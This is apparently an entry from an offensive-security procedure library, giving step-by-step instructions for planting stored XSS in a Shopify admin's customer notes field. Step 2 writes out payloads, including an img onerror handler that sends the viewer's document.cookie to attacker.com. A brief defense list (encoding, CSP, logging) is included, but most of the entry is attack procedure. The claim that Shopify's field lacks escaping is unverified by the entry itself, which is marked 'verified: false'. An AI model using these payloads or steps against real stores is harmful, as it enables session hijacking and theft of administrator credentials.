---
tags:
  - xss
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f8c2d125-00c3-4535-82a0-d794b86f5f80
created_at: '2025-12-13T23:55:06.657Z'
updated_at: '2025-12-13T23:55:06.657Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Customer-Notes

## Summary

This procedure involves editing a customer profile in the Shopify admin and inserting a malicious JavaScript payload into the notes field, exploiting poor sanitization to store XSS code for later execution.

## Description

The customer notes field in Shopify's admin (/admin/customers/{customer_id}) accepts user input without adequate HTML/JS escaping. Attackers with edit access can inject payloads like javascript:alert(document.cookie) within tags. Upon saving, the payload persists. This targets authenticated admins viewing the notes, potentially leading to session theft. Prerequisites include admin access from the prior step.

## Requirements

1. Authenticated session in Shopify admin
2. Access to edit a specific customer profile
3. Knowledge of XSS payloads (e.g., cookie-stealing scripts)

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML entity encoding (e.g., &lt; for <)
- Use Content Security Policy (CSP) to block inline scripts
- Log and alert on suspicious notes content (e.g., script tags)

## Objectives

1. Persist malicious code in the notes field
2. Ensure payload survives saving without stripping
3. Set up for execution on view

## Instructions

### Step 1: Select and Edit Customer Profile

**Context**: Choose a target profile to modify the notes.

From the customers list, click on a customer ID to open the profile, then select "Edit customer."

> Profile details load, including the editable notes textarea.

### Step 2: Insert XSS Payload

**Context**: Enter the malicious input to inject executable code.

In the notes field, type a payload such as `<a href="javascript:alert(document.cookie)">Click me</a>` or `<img src=x onerror="window.location='http://attacker.com?cookie='+document.cookie">`. Click "Save".

> The field accepts the input, and the profile saves; no errors if filtering is bypassed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
